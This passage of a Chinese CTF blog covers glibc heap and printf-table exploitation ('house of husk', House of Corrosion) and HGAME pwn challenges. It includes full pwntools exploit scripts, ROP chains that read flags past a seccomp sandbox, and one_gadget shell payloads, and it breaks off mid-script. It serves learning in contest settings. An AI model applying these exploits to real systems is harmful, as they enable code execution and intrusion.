sh.recvuntil(<span class="string">&#x27;Data:&#x27;</span>)</span><br><span class="line">    sh.send(p64(system))</span><br><span class="line">    free(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    sh.interactive()</span><br><span class="line">    </span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><p>got表真是个好东西（如果能写的话）</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/02/house-of-husk/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/02/02/house-of-husk/" class="post-title-link" itemprop="url">house of husk</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-02-02 20:23:19 / 修改时间：20:25:39" itemprop="dateCreated datePublished" datetime="2022-02-02T20:23:19+08:00">2022-02-02</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="house-of-husk"><a href="#house-of-husk" class="headerlink" title="house of husk"></a>house of husk</h1><p>针对printf函数的攻击，主要利用printf函数的虚表，通过篡改虚表指针执行ogg。</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>printf函数在执行过程中会根据第一个格式化字符”%X”在虚表__printf_arginfo_table和__printf_function_table寻找函数指针进行执行，具体寻找过程就是__printf_arginfo_table[‘X’],找到这个指针，然后跳到这执行，只要把这里的指针改成ogg就可以getshell,修改这里的指针大致分为两种办法，一种是任一地址写，直接写这两个虚表对应地址的指针，第二个是通过堆伪造这两个虚表，第一个很好理解，主要讲一下第二个。</p>
<h2 id="伪造虚表"><a href="#伪造虚表" class="headerlink" title="伪造虚表"></a>伪造虚表</h2><p>__printf_arginfo_table和__printf_function_table这两个虚表地址储存在main_arena下面的地址中，而且和main_arena首地址很接近，在我这个glibc版本下只相差0xc30，这是伪造的第一步</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7dce870 &lt;__printf_arginfo_table&gt;:	0x000000000060bb90	0x0000000000000000</span><br><span class="line">0x7ffff7dce880 &lt;buf&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dce890 &lt;buffer&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dce8a0 &lt;buffer&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dce8b0 &lt;buffer&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dce8c0 &lt;buffer&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dce8d0 &lt;ttyname_buf&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dce8e0 &lt;getmntent_buffer&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dce8f0 &lt;qfcvt_bufptr&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dce900 &lt;buffer&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/20gx &amp;main_arena</span></span><br><span class="line">0x7ffff7dcdc40 &lt;main_arena&gt;:	0x0000000000000000	0x0000000000000001</span><br><span class="line">0x7ffff7dcdc50 &lt;main_arena+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dcdc60 &lt;main_arena+32&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dcdc70 &lt;main_arena+48&gt;:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>要想执行这两个虚表储存的函数指针，得先找见这两个虚表地址才行，然后通过虚表地址加上偏移量得到函数地址跳进去执行，这两个虚表地址储存在固定的位置，所以只要能覆盖这两个虚表地址成堆地址，然后再相应偏移量处添上ogg就可以getshell了吗不是。</p>
<p>现在关键的就是覆盖虚表地址，网上的普遍做法是利用House of Corrosion技术。这个技术和fastbin息息相关。</p>
<h3 id="House-of-Corrosion"><a href="#House-of-Corrosion" class="headerlink" title="House of Corrosion"></a>House of Corrosion</h3><p>众所周知，fastbin链表的大小是0x20到0x80之间，但其实最大值并不是固定的，而是global_max_fast中的值决定的，一般是0x80,所以fastbin的最大值就是0x80</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7dcf940 &lt;global_max_fast&gt;:	0x0000000000000080	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>所以可以通过改变这个地方的值让fasbin能接受的最大值变大，一般是利用unsortbinattack，也可以直接ufa来完成。</p>
<p>还有一个知识点就是从<code>main_arena+8</code>开始存放<code>fastbin[0x20]</code>的头指针,glibc预留了十个指针来存放fastbin的头指针，比如free的chunk是0x50,那储存这个堆地址的地址是main_arena+8+(0x50-0x20)/0x10*8也就是在main_arena+32处存放堆地址，简而言之就是main_arena+8加上偏移量处存放堆地址，这个偏移量和size正相关，当通过修改global_max_fast的值让可free的chunk的size是任意值，那我们就可以向main_arena+8后的任意一个地址填上堆地址了。</p>
<p>很有意思的攻击手段，那也就是说可以向__printf_arginfo_table和__printf_function_table中填入堆地址了，到这里攻击思路就闭环。</p>
<h2 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h2><p>先修改global_max_fast的值，然后申请两个堆，堆的大小通过下面的公式算出，各伪造一个虚表，然后再伪造printf_arginfo_table的堆上写好ogg,然后都free掉修改虚表地址，最后调用printf完成攻击</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>1.不同版本main_arena+8到__printf_arginfo_table和__printf_function_table的偏移量不同，根据偏移量确定size的值完成堆地址覆盖。</p>
<p>​               chunk_size=地址差值*2+0x20</p>
<p>2.实施前提：</p>
<p>​            1.有至少一次ufa完成global_max_fast的修改                                                                                                                                                                              </p>
<p>​            2.有prinf函数且第二个参数可控</p>
<p>例题 HWS pwn1</p>
<p>感觉这道题作为house of husk的入门题挺不错的，简直就是专门为这个利用而生,刚好有一次unsortbinatack,刚好能申请两个合法的堆，刚好有很多printf</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">fastbinY=libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]+<span class="number">0x10</span>+<span class="number">8</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x4f3d5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f432 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a41c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Now you can get a big box, what size?\n&#x27;</span>)</span><br><span class="line">    print_arginfo_table=<span class="number">0x3ec870</span></span><br><span class="line">    printf_function_table=<span class="number">0x3f0738</span></span><br><span class="line">    chunk_size1=(print_arginfo_table-fastbinY)*<span class="number">2</span>+<span class="number">0x20</span>-<span class="number">2</span>*<span class="number">0x10</span></span><br><span class="line">    chunk_size2=(printf_function_table-fastbinY)*<span class="number">2</span>+<span class="number">0x20</span>-<span class="number">2</span>*<span class="number">0x10</span></span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(chunk_size1))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Now you can get a bigger box, what size?\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(chunk_size2))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Do you want to rename?(y/n)\n&#x27;</span>)</span><br><span class="line">    sh.send(<span class="string">&#x27;y\x00&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Now your name is:&#x27;</span>)</span><br><span class="line">    libc_base=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x10</span>-<span class="number">96</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;please input your new name!\n&#x27;</span>)</span><br><span class="line">    global_max_fast_addr=libc_base+<span class="number">0x3ed940</span></span><br><span class="line">    sh.send(p64(<span class="number">0</span>)+p64(global_max_fast_addr-<span class="number">0x10</span>))</span><br><span class="line">    </span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;box?(1:big/2:bigger)\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Let\&#x27;s edit, &#x27;</span>)</span><br><span class="line">    ogg=libc_base+<span class="number">0x4f432</span></span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(ogg)</span><br><span class="line">    <span class="comment">#gdb.attach(sh)</span></span><br><span class="line">    payload=<span class="string">&quot;a&quot;</span>*<span class="number">8</span>*(<span class="built_in">ord</span>(<span class="string">&#x27;s&#x27;</span>)-<span class="number">2</span>) + p64(ogg)*<span class="number">2</span></span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/22/HGAME/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/01/22/HGAME/" class="post-title-link" itemprop="url">HGAME</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-01-22 21:10:53 / 修改时间：21:11:07" itemprop="dateCreated datePublished" datetime="2022-01-22T21:10:53+08:00">2022-01-22</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="HGAME—-PWN"><a href="#HGAME—-PWN" class="headerlink" title="HGAME—-PWN"></a>HGAME—-PWN</h1><p>感觉题目质量挺高的，目前就做了pwn1,pwn3,pwn4.pwn1是一个简单的栈溢出，重点记录一下pwn3和pwn4的攻击思路，因为是我第一次见到这种思路。（全程被ayoung和mark带）</p>
<h2 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h2><p>题目提示反弹不了shell而且存flag的文件不叫flag,所以不能用传统的orw的rop来得到flag,沙盒里也禁用了一些函数</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">rootzhang@rootzhang-virtual-machine:~/get-shell/hgame/pwn3/to_give_out$ seccomp-tools dump ./vuln</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x0b 0xc000003e  if (A != ARCH_X86_64) goto 0013</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x09 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0013</span><br><span class="line"> 0004: 0x15 0x08 0x00 0x0000003b  if (A == execve) goto 0013</span><br><span class="line"> 0005: 0x15 0x07 0x00 0x00000142  if (A == execveat) goto 0013</span><br><span class="line"> 0006: 0x15 0x06 0x00 0x00000101  if (A == openat) goto 0013</span><br><span class="line"> 0007: 0x15 0x05 0x00 0x00000003  if (A == close) goto 0013</span><br><span class="line"> 0008: 0x15 0x04 0x00 0x00000055  if (A == creat) goto 0013</span><br><span class="line"> 0009: 0x15 0x03 0x00 0x00000086  if (A == uselib) goto 0013</span><br><span class="line"> 0010: 0x15 0x02 0x00 0x00000039  if (A == fork) goto 0013</span><br><span class="line"> 0011: 0x15 0x01 0x00 0x0000003a  if (A == vfork) goto 0013</span><br><span class="line"> 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0013: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>

<p>有些沙盒是白名单，有些沙盒是黑名单，这个就是黑名单，可以看出禁用了execve函数不能反弹shell.</p>
<h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>不能弹shell的话就得用orw来读flag,用orw的话得先知道对面文件名才行，mark提示说用getdents函数得到文件名再用orw得到flag,getdents函数的完整攻击思路是ogw,意即用open打开文件夹，用getdents函数把文件名在写程序里，然后用write函数写出来，这是调用他们时的参数构造</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">open(<span class="string">&#x27;./&#x27;</span>,<span class="number">0x1000</span>,<span class="number">0</span>)</span><br><span class="line">getdents(句柄（<span class="number">0</span>）,地址，<span class="keyword">unsigned</span> <span class="keyword">int</span> count)</span><br><span class="line">write(<span class="number">1</span>,地址，<span class="keyword">unsigned</span> <span class="keyword">int</span> count)</span><br></pre></td></tr></table></figure>

<p>先通过rop调用ogw得到flag文件名，然后调用orw读flag</p>
<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#sh=process(&#x27;./vuln&#x27;)</span></span><br><span class="line">sh=remote(<span class="string">&#x27;chuj.top&#x27;</span>,<span class="number">42614</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">x0000000000401443: pop rdi; ret;</span></span><br><span class="line"><span class="string">0x0000000000401441: pop rsi; pop r15; ret; </span></span><br><span class="line"><span class="string">0x000000000040143d: pop rsp; pop r13; pop r14; pop r15; ret; </span></span><br><span class="line"><span class="string">0x000000000011c371: pop rdx; pop r12; ret;</span></span><br><span class="line"><span class="string">x0000000000066229: syscall; ret;</span></span><br><span class="line"><span class="string">0x000000000004a550: pop rax; ret;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(sh,&#x27;b *0x00000000004013DC&#x27;)</span></span><br><span class="line">pop_rdi=<span class="number">0x0000000000401443</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x0000000000401441</span></span><br><span class="line">main=<span class="number">0x401311</span></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;size?\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;content?\n&#x27;</span>)</span><br><span class="line">bss_addr=<span class="number">0x404000</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>+p64(bss_addr+<span class="number">0x100</span>)+p64(pop_rdi)+p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(pop_rsi_r15)+p64(write_got)*<span class="number">2</span>+p64(write_plt)</span><br><span class="line">payload+=p64(main)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;done!\n&#x27;</span>)</span><br><span class="line">libc_base=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">execve_addr=libc_base+libc.sym[<span class="string">&#x27;execve&#x27;</span>]</span><br><span class="line">binsh_addr=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">pop_rdx_r12=libc_base+<span class="number">0x000000000011c371</span></span><br><span class="line">syscall_addr=libc_base+<span class="number">0x0000000000066229</span></span><br><span class="line">pop_rax=libc_base+<span class="number">0x000000000004a550</span></span><br><span class="line">b=<span class="string">&#x27;b *&#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(syscall_addr)</span><br><span class="line"><span class="comment">#gdb.attach(sh,b)</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(execve_addr)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;size?\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;content?\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>+p64(bss_addr+<span class="number">0x100</span>)+p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi_r15)</span><br><span class="line">payload+=p64(bss_addr+<span class="number">0x100</span>)*<span class="number">2</span>+p64(pop_rdx_r12)+p64(<span class="number">0x30</span>)*<span class="number">2</span>+p64(pop_rax)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(syscall_addr)+p64(main)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;done!\n&#x27;</span>)</span><br><span class="line"><span class="comment">#sh.send(&#x27;./\x00&#x27;)</span></span><br><span class="line">sh.send(<span class="string">&#x27;flagd44b02e91a1d1648cbfc\x00&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;size?\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;content?\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>+p64(bss_addr+<span class="number">0x100</span>)+p64(pop_rdi)+p64(bss_addr+<span class="number">0x100</span>)+p64(pop_rsi_r15)</span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(pop_rdx_r12)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(pop_rax)+p64(<span class="number">2</span>)+p64(syscall_addr)</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">3</span>)+p64(pop_rsi_r15)+p64(bss_addr+<span class="number">0x100</span>)*<span class="number">2</span>+p64(pop_rdx_r12)</span><br><span class="line">payload+=p64(<span class="number">0x300</span>)*<span class="number">2</span>+p64(pop_rax)+p64(<span class="number">0</span>)+p64(syscall_addr)+p64(pop_rdi)+p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(pop_rsi_r15)+p64(bss_addr+<span class="number">0x100</span>)*<span class="number">2</span>+p64(pop_rdx_r12)+p64(<span class="number">0x300</span>)*<span class="number">2</span></span><br><span class="line">payload+=p64(pop_rax)+p64(<span class="number">1</span>)+p64(syscall_addr)+p64(main)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line"><span class="comment">#hgame&#123;1-4dm1T~The-rop-ChA!N-M4YBE~TOoO0oooO0-l0Ng_And~$Orry_fOR_ThE~|Nc0NVenIENCE:(&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>感觉构造rop的挺好玩的</p>
<h2 id="pwn4"><a href="#pwn4" class="headerlink" title="pwn4"></a>pwn4</h2><p>程序就是spfa算法的实现，刚开始我就分析出思路了，就是利用dist进行任意读和任意写，本来打算是利用exit_hook拿shell的，改是能改成功，但是改成功后程序就异常退出了，他也不调用exit-hook啊，实现+调试+发现错误+定位错误就用了一天，晚上十二点多是在受不了就问了ayoung,他告诉我改写io虚表指针，我哪知道这是啥啊，第一次听，但是改io指针肯定是通过printf或者scanf实现的，我就进行慢慢调试程序，还真被我发现一些虚表了，mark利用io_file_jumps出了，我利用io_helper_jumps出了（四点出的）</p>
<h3 id="脚本-1"><a href="#脚本-1" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sh=remote(<span class="string">&#x27;chuj.top&#x27;</span>,<span class="number">47250</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#sh=process(&#x27;./spfa&#x27;)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh,&#x27;b main&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(sh,&quot;b main&quot;)</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;how many datas?\n&gt;&gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;how many nodes?\n&gt;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;how many edges?\n&gt;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;input edges in the\n[from] [to] [distant]\nformat&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">0x20</span>))</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">0x30</span>))</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;you want to start from which node?\n&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27; to ?\n&gt;&gt;&#x27;</span>,<span class="built_in">str</span>(-<span class="number">2275</span>))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;the length of the shortest path is &#x27;</span>)</span><br><span class="line">    dist_addr=<span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>).split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">0</span>])-<span class="number">8</span>+<span class="number">0x4720</span></span><br><span class="line">    elf_base=dist_addr-<span class="number">0x4720</span>-<span class="number">0x7000</span></span><br><span 